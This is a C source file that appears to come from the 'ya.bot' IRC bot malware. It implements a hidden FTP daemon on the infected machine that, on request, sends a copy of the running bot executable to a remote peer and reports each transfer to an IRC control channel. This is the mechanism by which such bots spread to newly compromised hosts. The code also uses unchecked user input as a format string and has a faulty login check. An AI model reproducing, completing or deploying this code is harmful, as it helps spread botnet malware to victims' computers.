/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_DAEMONFTP
DWORD WINAPI daemon_ftphandler(LPVOID param)
{
	char *pszParameter[4], szBuffer[IRCBUF], szFilePath[MAX_PATH],
			szIP[16], szPassword[64], szUserName[64];
	SDaemonFTP s_df = *((SDaemonFTP *)param);
	int i, nConInfo[8], nPort;

#ifndef NO_DEBUG
		debug_print("Handling ftp connection, daemon_ftphandler()");
#endif

		_snprintf(szBuffer, sizeof(szBuffer) - 1, string_daemonftp220, "\r\n");
	if (send(s_df.m_csock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
	{
			closesocket(s_df.m_csock);
			return 0;
	}
	while (TRUE)
	{
		if (recv(s_df.m_csock, szBuffer, sizeof(szBuffer) - 1, 0) == SOCKET_ERROR)
				break;
			pszParameter[0] = strtok(szBuffer, " \r\n");
		for (i = 1; i < 4; i++)
				pszParameter[i] = strtok(NULL, " \r\n");
		if (!pszParameter[0])
				break;
		if (strcmp(string_daemonftpuser, pszParameter[0]) == 0) 
		{
			if (!pszParameter[1])
					break;
				_snprintf(szUserName, sizeof(szUserName) - 1, pszParameter[1]);
				_snprintf(szBuffer, sizeof(szBuffer) - 1, string_daemonftp331, "\r\n");
			if (send(s_df.m_csock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
					break;
		}
		else if (strcmp(string_daemonftppass, pszParameter[0]) == 0)
		{
			if (!pszParameter[1])
					break;
				_snprintf(szPassword, sizeof(szPassword) - 1, pszParameter[1]);
			if ((strcmp(daemonftpuser,
						szUserName) != 0) &&
					(strcmp(daemonftppass,
							szPassword) != 0))
					break;
				_snprintf(szBuffer, sizeof(szBuffer) - 1, string_daemonftp230, "\r\n");
			if (send(s_df.m_csock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
					break;
		}
		else if (strcmp(string_daemonftpport, pszParameter[0]) == 0)
		{
			if (!pszParameter[1])
					break;
				sscanf(pszParameter[1],
						string_daemonftpportinfo,
						&nConInfo[0],
						&nConInfo[1],
						&nConInfo[2],
						&nConInfo[3],
						&nConInfo[4],
						&nConInfo[5]);
				nPort = (nConInfo[4] << 8) + nConInfo[5];
				_snprintf(szIP, sizeof(szIP) - 1,
						string_setip,
						nConInfo[0],
						nConInfo[1],
						nConInfo[2],
						nConInfo[3]);
				_snprintf(szBuffer, sizeof(szBuffer) - 1, string_daemonftp200, "\r\n");
			if (send(s_df.m_csock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
					break;
		}
		else if (strcmp(string_daemonftpretr, pszParameter[0]) == 0)
		{
			if (!pszParameter[1])
					break;
			if (strcmp(botfilename, pszParameter[1]) != 0)
					break;
				_snprintf(szBuffer, sizeof(szBuffer) - 1, string_daemonftp150, "\r\n");
			if (send(s_df.m_csock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
					break;
				GetModuleFileName(NULL, szFilePath, sizeof(szFilePath) - 1);
			if ((!s_df.m_bSilent) && (s_df.m_bVerbose))
					irc_message(s_df.m_bsock,
							(char *)string_ircprivmsg, s_df.m_szResultChannel,
							(char *)string_daemonftptransferstarted,
							CBLUE, string_replyftpd, CEND, string_replydotbot,
							CBLUE, CEND, szIP, nPort,
							CBLUE, szFilePath, CEND);
			if (daemon_ftptransfer(szIP, nPort, szFilePath))
			{
					_snprintf(szBuffer, sizeof(szBuffer) - 1, string_daemonftp226, "\r\n");
					send(s_df.m_csock, szBuffer, strlen(szBuffer), 0);
					g_nTransfers++;
				if (!s_df.m_bSilent)
						irc_message(s_df.m_bsock,
								(char *)string_ircprivmsg, s_df.m_szResultChannel,
								(char *)string_daemonftptransferfinished,
								CGREEN, string_replyftpd, CEND, string_replydotbot,
								CBLUE, CEND, szIP, nPort,
								CBLUE, szFilePath, CEND);
					break;
			}
			else
			{
					_snprintf(szBuffer, sizeof(szBuffer) - 1, string_daemonftp425, "\r\n");
					send(s_df.m_csock, szBuffer, strlen(szBuffer), 0);
				if ((!s_df.m_bSilent) && (s_df.m_bVerbose))
						irc_message(s_df.m_bsock,
								(char *)string_ircprivmsg, s_df.m_szResultChannel,
								(char *)string_daemonftptransferfailed,
								CRED, string_replyftpd, CEND, string_replydotbot,
								CBLUE, CEND, szIP, nPort,
								CBLUE, szFilePath, CEND);
					break;
			}
		}
		else if (strcmp(string_ircquit, pszParameter[0]) == 0)
				break;
	}
		_snprintf(szBuffer, sizeof(szBuffer) - 1, string_daemonftp221, "\r\n");
		send(s_df.m_csock, szBuffer, strlen(szBuffer), 0);
		closesocket(s_df.m_csock);
		return 0;
}

DWORD WINAPI daemon_ftpmain(LPVOID param)
{
	SDaemonFTP s_dfn, s_dfo = *((SDaemonFTP *)param);
	register int nSize;
	sockaddr_in sin;
	SOCKET sock, csock;

#ifndef NO_DEBUG
		debug_print("Starting ftp daemon, daemon_ftpmain()");
#endif

		sin.sin_addr.s_addr = INADDR_ANY;
		sin.sin_family = AF_INET;
		sin.sin_port = htons(daemonftpport);
		nSize = sizeof(sin);
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
			thread_remove(THREAD_DAEMONFTP);
			return 0;
	}
	if (bind(sock, (sockaddr *)&sin, nSize) == SOCKET_ERROR)
	{
			closesocket(sock);
			thread_remove(THREAD_DAEMONFTP);
			return 0;
	}
	if (listen(sock, 10) == SOCKET_ERROR)
	{
			closesocket(sock);
			thread_remove(THREAD_DAEMONFTP);
			return 0;
	}
		s_dfn = s_dfo;
	while (TRUE)
	{
			csock = accept(sock, (sockaddr *)&sin, &nSize);
		if (csock != INVALID_SOCKET)
		{
				s_dfn.m_csock = csock;
				CreateThread(NULL, 0, daemon_ftphandler, &s_dfn, 0, NULL);
		}
	}
		closesocket(csock);
		closesocket(sock);
		thread_remove(THREAD_DAEMONFTP);
		return 0;
}

bool daemon_ftptransfer(char *pszIP, int nPort, char *pszFilePath)
{
	char szBuffer[MASBUF + 1], szFilePath[MAX_PATH];
	DWORD dwRead, dwSize;
	HANDLE hFile;
	sockaddr_in sin;
	SOCKET sock;
	
#ifndef NO_DEBUG
		debug_print("Transfering file through ftp, daemon_ftptransfer()");
#endif

		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(pszIP);
		sin.sin_port = htons(nPort);
		sock = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
			closesocket(sock);
			return FALSE;
	}
		GetModuleFileName(NULL, szFilePath, sizeof(szFilePath) - 1);
		hFile = CreateFile(szFilePath,
				GENERIC_READ,
				FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,
				0,
				NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
			closesocket(sock);
			return FALSE;
	}
		SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
		dwSize = GetFileSize(hFile, NULL);
	do
	{
			ReadFile(hFile, szBuffer, sizeof(szBuffer) - 1, &dwRead, NULL);
			send(sock, szBuffer, dwRead, 0);
	} while (dwRead == MASBUF);
		CloseHandle(hFile);
		closesocket(sock);
		return TRUE;
}
#endif